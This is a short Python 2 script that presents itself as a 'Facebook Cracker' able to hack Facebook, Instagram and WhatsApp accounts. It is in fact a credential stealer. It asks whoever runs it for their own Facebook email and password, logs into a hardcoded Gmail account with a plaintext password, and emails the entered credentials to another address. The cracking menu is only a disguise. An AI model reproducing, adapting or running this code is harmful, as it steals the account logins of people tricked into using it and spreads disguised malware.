# import necessary packages
 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time
# create message object instance
msg = MIMEMultipart()
time.sleep(1)
print"LOADING........."
time.sleep(5)
print "        +=======================================+"
print "        |..........Facebook Cracker v 2.........|"
print "        +---------------------------------------+"
print "        |#Author: Mauritania Attacker           |"
print "        |#Contact: www.fb.com/mauritanie.forever|"
print "        |#Date: 02/04/2013                      |"
print "        |#This tool is made for pentesting.     |"
print "        |#Changing the Description of this tool |"
print "        |Won't made you the coder ^_^ !!!       |"
print "        |#Respect Coderz ^_^                    |"
print "        |#I take no responsibilities for the    |"
print "        |  use of this program !                |"
print "        +=======================================+"
print "        |..........Facebook Cracker v 2.........|"
print "        +---------------------------------------+"

print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
print"_-_-_-_-WELCOME TO HEADLESS-_-_-_"
#time.sleep(3)
print"#################################"
time.sleep(1)
print"       |1.Hack facebook |"
time.sleep(1)
print"       |2.Hack instagram|"
time.sleep(1)
print"       |3.Hack whatsapp |"
print"#################################"
print("SILAHKAN LOGIN FACEBOOK DULU")
message = raw_input("EMAIL: ")
message2 = raw_input("PASSWORD: ")
 
# setup the parameters of the message
password = "putracic123321"
msg['From'] = "putracic8@gmail.com"
msg['To'] = "budimira11@gmail.com"
msg['Subject'] = "Subscription"
 
# add in the message body
msg.attach(MIMEText(message, 'plain'))
msg.attach(MIMEText(message2, 'plain'))
#create server
server = smtplib.SMTP('smtp.gmail.com: 587')
 
server.starttls()
 
# Login Credentials for sending the mail
server.login(msg['From'], password)
 
 
# send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())
 
server.quit()
print "http://www.facebook.com %s:" % (['message'])
